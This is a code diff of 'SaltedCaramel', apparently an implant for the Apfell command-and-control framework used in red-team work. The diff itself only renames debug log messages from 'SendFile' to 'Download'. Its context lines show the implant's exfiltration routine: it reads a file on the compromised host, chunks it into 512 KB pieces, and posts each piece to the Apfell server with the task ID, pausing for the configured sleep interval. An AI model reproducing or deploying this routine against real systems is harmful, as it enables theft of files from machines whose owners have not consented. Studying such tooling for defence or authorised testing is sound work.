@@ -16,20 +16,20 @@ namespace SaltedCaramel.Tasks
                 // Get file info to determine file size
                 FileInfo fileInfo = new FileInfo(filepath);
                 long size = fileInfo.Length;
-                Debug.WriteLine($"[+] SendFile - DOWNLOADING: {filepath}, {size} bytes");
+                Debug.WriteLine($"[+] Download - DOWNLOADING: {filepath}, {size} bytes");
 
                 // Determine number of 512kb chunks to send
                 long total_chunks = size / 512000;
                 // HACK: Dumb workaround because longs don't have a ceiling operation
                 if (total_chunks == 0)
                     total_chunks = 1;
-                Debug.WriteLine($"[+] SendFile - File size = {size} ({total_chunks} chunks)");
+                Debug.WriteLine($"[+] Download - File size = {size} ({total_chunks} chunks)");
 
                 // Send number of chunks associated with task to Apfell server
                 // Response will have the file ID to send file with
                 TaskResponse initial = new TaskResponse("{\"total_chunks\": " + total_chunks + ", \"task\": \"" + task.id + "\"}", task.id);
                 DownloadReply reply = JsonConvert.DeserializeObject<DownloadReply>(implant.PostResponse(initial));
-                Debug.WriteLine($"[-] SendFile - Received reply, file ID: " + reply.file_id);
+                Debug.WriteLine($"[-] Download - Received reply, file ID: " + reply.file_id);
 
 
                 // Send file in chunks
@@ -67,8 +67,8 @@ namespace SaltedCaramel.Tasks
 
                     // Send our FileChunk to Apfell server
                     TaskResponse response = new TaskResponse(JsonConvert.SerializeObject(fc), task.id);
-                    Debug.WriteLine($"[+] SendFile - CHUNK SENT: {fc.chunk_num}");
-                    Debug.WriteLine($"[-] SendFile - RESPONSE: {implant.PostResponse(response)}");
+                    Debug.WriteLine($"[+] Download - CHUNK SENT: {fc.chunk_num}");
+                    Debug.WriteLine($"[-] Download - RESPONSE: {implant.PostResponse(response)}");
                     // Make sure we respect the sleep setting
                     Thread.Sleep(implant.sleep);
                 }
@@ -76,13 +76,13 @@ namespace SaltedCaramel.Tasks
 
                 // Tell the Apfell server file transfer is done
                 implant.SendComplete(task.id);
-                Debug.WriteLine($"[+] SendFile - File transfer complete: {filepath}");
+                Debug.WriteLine($"[+] Download - File transfer complete: {filepath}");
             }
             catch (Exception e) // Catch any exception from file upload
             {
                 // Something failed, so we need to tell the server about it
                 implant.SendError(task.id, e.Message);
-                Debug.WriteLine($"[!] SendFile - ERROR: {e.Message}");
+                Debug.WriteLine($"[!] Download - ERROR: {e.Message}");
             }
 
         }
